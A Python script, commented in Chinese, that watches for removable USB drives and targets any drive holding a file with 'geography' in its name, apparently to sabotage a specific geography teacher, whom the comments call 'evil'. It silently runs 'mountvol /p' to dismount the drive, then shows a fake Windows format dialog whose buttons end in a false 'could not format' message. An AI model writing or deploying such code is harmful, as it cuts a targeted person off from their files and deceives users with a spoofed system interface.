import time
import os
import subprocess
import tkinter as tk
from tkinter import messagebox
from psutil import disk_partitions

name = "no"
filelist = []
path = ""

def disable_usb_drive(drive_letter):
    # 禁！止！U！盘！读！写！
    subprocess.run(
        ["mountvol", drive_letter, "/p"],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

def show_real_format_window(drive_letter):
    tk.messagebox.showinfo(f"格式化 {drive_letter[:-1]}", f"Windows无法完成格式化 {drive_letter[:-1]}。")

def show_fake_format_window(drive_letter):
    # 伪装成Windows格式化的提示窗体
    root = tk.Tk()
    root.title("Microsoft Windows")
    root.geometry("500x180")
    root.resizable(False, False)

    top_frame = tk.Frame(root, bg="white")
    top_frame.place(x=0, y=0, width=500, height=110)
    label2 = tk.Label(top_frame, text=f"使用驱动器 {drive_letter[:-1]} 中的光盘之前需要将其格式化。", font=("微软雅黑", 14), bg="white")
    label2.pack(pady=(20, 5), anchor='w', padx=10)
    label3 = tk.Label(top_frame, text="是否要将其格式化？", font=("微软雅黑", 10), bg="white")
    label3.pack(anchor='w', padx=10)
    sep = tk.Frame(root, bg="#e0e0e0", height=2, width=500)
    sep.place(x=0, y=110)
    bottom_frame = tk.Frame(root, bg="#f0f0f8")
    bottom_frame.place(x=0, y=112, width=500, height=68)
    btn_frame = tk.Frame(bottom_frame, bg="#f0f0f8")
    btn_frame.pack(side=tk.RIGHT, padx=20, pady=18)
    btn_format = tk.Button(
        btn_frame, text="格式化磁盘", width=15,
        command=lambda: [
            root.destroy(),
            show_real_format_window(drive_letter)
        ]
    )
    btn_format.pack(side=tk.LEFT, padx=5)
    btn_cancel = tk.Button(
        btn_frame, text="取消", width=15,
        command=lambda: root.destroy()
    )
    btn_cancel.pack(side=tk.LEFT, padx=5)
    root.attributes("-topmost", True)
    root.mainloop()

def GetGeographyFiles():
    global filelist, path
    if name == "yes" and path:
        try:
            filelist = os.listdir(path)
        except Exception as e:
            return
        for file in filelist:
            if "地理" in file:
                disable_usb_drive(path)
                show_fake_format_window(path)
                break

def SanctionTheEvilEnokiMushrooms():
    #制！裁！邪！恶！地！理！老！师！
    global name, path
    checked = set()
    while True:
        time.sleep(0.1)
        current_removables = set(disk.device for disk in disk_partitions() if 'removable' in disk.opts)
        for disk in disk_partitions():
            if 'removable' in disk.opts and disk.device not in checked:
                path = disk.device
                name = "yes"
                GetGeographyFiles()
                checked.add(disk.device)
        checked -= (checked - current_removables)

if __name__ == "__main__":
    SanctionTheEvilEnokiMushrooms()
